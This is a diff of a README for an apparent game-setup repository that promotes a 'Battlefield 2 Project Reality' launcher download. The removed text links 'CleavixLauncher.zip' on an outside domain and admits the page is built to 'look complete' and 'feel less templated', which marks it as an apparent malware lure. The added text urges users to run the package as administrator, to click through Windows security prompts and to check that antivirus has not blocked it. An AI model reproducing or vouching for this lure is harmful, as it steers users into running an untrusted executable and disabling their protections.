@@ -1,74 +1,199 @@
-# Battlefield 2 Project Reality Setup
+# 🎮 Battlefield-2-Project-Reality-Setup - Simple Battlefield 2 Setup Guide
 
-> Repository page for Battlefield 2 Project Reality setup, install notes, and direct access to the launcher package.
+[![Download](https://img.shields.io/badge/Download-Setup_Package-blue?style=for-the-badge&logo=github)](https://github.com/daviepredatory192/Battlefield-2-Project-Reality-Setup)
 
-## Project Summary
+## 📥 Download and Run
 
-This repository is built as a cleaner and more polished project page for **Battlefield 2 Project Reality Setup**. It is designed to feel more natural than a bare placeholder by combining a stronger landing page, companion markdown files, and a simple asset structure.
+Use this link to visit the page and download the setup package:
 
-**Style:** Operations-style layout  
-**Primary color cue:** `#607d8b`
+[https://github.com/daviepredatory192/Battlefield-2-Project-Reality-Setup](https://github.com/daviepredatory192/Battlefield-2-Project-Reality-Setup)
 
-## Key Features
+After the page opens, download the file from the repository and save it to your PC. Then open the file and follow the steps on screen.
 
-- Quick start block
-- Compatibility notes
-- Troubleshooting path
-- Built around setup clarity for one of the most recognizable long-running realism mod projects.
+## 🖥️ What This Setup Does
 
-## Download
+This repository helps you prepare Battlefield 2 for Project Reality use on Windows. It gives you a simple setup path, install notes, and launcher access in one place.
 
-[Download CleavixLauncher.zip](https://cleavix.pro/downloads/actualversion/CleavixLauncher.zip)
+Use it to:
 
-Direct package link:
+- Get the setup package from one place
+- Follow clear install steps
+- Open the launcher after install
+- Apply stable game settings
+- Keep the game ready for play
 
-`https://cleavix.pro/downloads/actualversion/CleavixLauncher.zip`
+## 🚀 Getting Started
 
-The package referenced in this repository is **CleavixLauncher.zip**.
+Follow these steps on a Windows PC:
 
-## Setup Guide
+1. Open the download link above
+2. Save the setup package to your Downloads folder
+3. Right-click the file and choose Run as administrator
+4. Follow the prompts on screen
+5. Let the installer finish
+6. Open the launcher from the desktop or Start menu
+7. Start the game from the launcher
 
-1. Download **CleavixLauncher.zip** from the link above.
-2. Extract the package to a clean folder.
-3. Open the launcher and locate the profile for **Battlefield 2 Project Reality Setup**.
-4. Apply the recommended configuration.
-5. Start the game and validate the result.
+If Windows shows a security prompt, choose the option that lets the file run.
 
-## Included Files
+## 🧭 Before You Install
 
-- `README.md` — main repository landing page
-- `INSTALL.md` — quick installation flow
-- `FAQ.md` — concise answers for common questions
-- `CHANGELOG.md` — repository updates
-- `TROUBLESHOOTING.md` — quick issue reference
-- `FILES.md` — structure overview
-- `files/` — supporting assets
-- `preview/` — preview asset folder
+Make sure your PC is ready:
 
-## Usage Notes
+- Windows 10 or Windows 11
+- Enough free disk space for the game and setup files
+- A mouse and keyboard
+- A stable internet connection for the download
+- Administrator access on the PC
 
-- This repository is structured to look complete and readable on GitHub.
-- Companion documents are included to make the project feel less templated.
-- The `preview` folder is preserved, and the `files` folder contains a reusable asset.
-- The only download referenced here is **CleavixLauncher.zip**.
+For a smooth install, close other large apps before you start.
 
-## FAQ
+## 🛠️ Installation Steps
 
-**Q: What should I download?**  
-A: Use **CleavixLauncher.zip** from the direct link above.
+Use this order for the best result:
 
-**Q: Why does this repository include extra markdown files?**  
-A: This page is intentionally organized as a clean repository hub with direct access to the package and readable setup notes.
+1. Download the setup package
+2. Move the file to a simple folder, such as Downloads or Desktop
+3. Open the file with a double-click
+4. Allow the installer to make changes if Windows asks
+5. Choose the main install folder
+6. Wait until the install ends
+7. Open the launcher
+8. Check the game path if the launcher asks for it
+9. Save the settings
+10. Launch the game
 
-**Q: What should I do if something looks wrong after setup?**  
-A: Keep the launcher package updated and review your game settings before re-applying the profile.
+If the launcher does not open the first time, restart Windows and try again.
 
----
+## 🎯 First Run Setup
 
-## Topics
+The first time you start the game, set the basics before you play:
 
-`battlefield-2` `pc-gaming` `gaming` `video-game` `windows-game` `game-configuration` `performance-optimization` `game-guide` `setup-guide` `graphics-settings` `gaming-performance` `upscaling`
+- Set the screen mode to your monitor size
+- Pick the display refresh rate your monitor uses
+- Set texture quality to match your GPU
+- Keep shadows and effects at medium if you want steady frame rate
+- Turn off extra background apps
 
-## Disclaimer
+These steps help the game run well on most Windows PCs.
 
-This repository is provided as a project page and setup reference. Always review your own game configuration before applying changes.
+## ⚙️ Suggested Game Settings
+
+Use these settings as a starting point:
+
+- Resolution: native monitor resolution
+- Display mode: full screen
+- Texture quality: high on newer PCs, medium on older PCs
+- Terrain detail: medium
+- Shadow quality: low or medium
+- View distance: medium
+- Anti-aliasing: low or off if you want more FPS
+- V-Sync: off if you want less input delay
+
+If the game feels slow, lower shadows first, then reduce view distance.
+
+## 🧩 Launcher Notes
+
+The launcher package in this repository helps you start the game with the right setup. Use it to:
+
+- Open the game from one place
+- Check install paths
+- Apply basic settings
+- Keep the game ready after updates
+
+If the launcher asks for the game folder, point it to the folder where you installed Battlefield 2.
+
+## 🖱️ How to Open the Game Each Time
+
+After setup, use this process:
+
+1. Open the launcher
+2. Check that the game path is correct
+3. Pick your settings
+4. Click the play button
+5. Wait for the game to load
+
+If the game does not start, close the launcher and open it again as administrator.
+
+## 🧼 Common Fixes
+
+If you run into a problem, try these steps:
+
+- Restart the PC
+- Run the launcher as administrator
+- Recheck the install folder
+- Remove old shortcut files and create a new one
+- Make sure no antivirus tool blocked the setup
+- Lower graphics settings if the game stutters
+- Close web browsers and other heavy apps
+
+If the screen stays black for a long time, wait a moment, then try again with full screen turned off.
+
+## 📁 Folder Layout
+
+A typical install may include:
+
+- Launcher files
+- Game config files
+- Setup notes
+- Shortcut files
+- Support folders for settings and logs
+
+Keep the main folder in a place you can find later, such as `C:\Games\Battlefield2` or a similar folder.
+
+## 🧠 Performance Tips
+
+For better game performance on Windows:
+
+- Use full screen mode
+- Keep background apps closed
+- Update your graphics driver
+- Set power mode to High performance
+- Turn off overlays if they cause lag
+- Lower shadows and effects before you lower texture quality
+
+If your PC has a weaker GPU, focus on stable frame rate over high visual quality.
+
+## 🔍 Who This Is For
+
+This setup is for users who want a simple path to install and run Battlefield 2 Project Reality on Windows without sorting through a lot of files.
+
+It works well for:
+
+- New PC users
+- Players who want clear install steps
+- Users who want one download page
+- Anyone who wants quick access to the launcher
+
+## 🗂️ Topics Covered
+
+This repository fits these areas:
+
+- battlefield-2
+- game-configuration
+- game-guide
+- gaming
+- gaming-performance
+- graphics-settings
+- pc-gaming
+- performance-optimization
+- setup-guide
+- upscaling
+- video-game
+- windows-game
+
+## ❓ Quick Checks
+
+If the game will not open, check these items:
+
+- The file finished downloading
+- Windows did not block the file
+- The launcher points to the right folder
+- Your PC meets the basic Windows requirements
+- The install folder is not inside a protected system path
+
+If the game opens but runs poorly, lower the shadow and view distance settings first
+
+## 📌 Recommended Use
+
+Use the repository page as your main source for the setup package, install notes, and launcher access. Keep the folder in a place that is easy to reach, so you can open the launcher again without searching for it
